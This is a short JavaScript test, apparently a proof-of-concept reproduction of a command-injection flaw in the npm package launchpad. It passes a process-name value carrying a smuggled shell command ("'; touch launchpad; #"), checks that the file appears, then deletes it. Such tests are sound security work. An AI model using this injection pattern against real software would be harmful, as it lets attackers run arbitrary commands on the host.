//https://github.com/bitovi/launchpad/pull/124
test("Command Injection in launchpad", () => 
{
    const launchpad = require("./node_modules/launchpad/lib/local/instance");
	const fs = require('fs')
	const path = './launchpad'
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
    var tst = new launchpad.Instance('t', {}, {}, {process:"s'; touch launchpad; # "});
    try
	{
		tst.getPid(function(){});
	}
	catch(error)
	{}
	tst.getPid(function(){});
	

	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});
//has some errors even though it has try catch


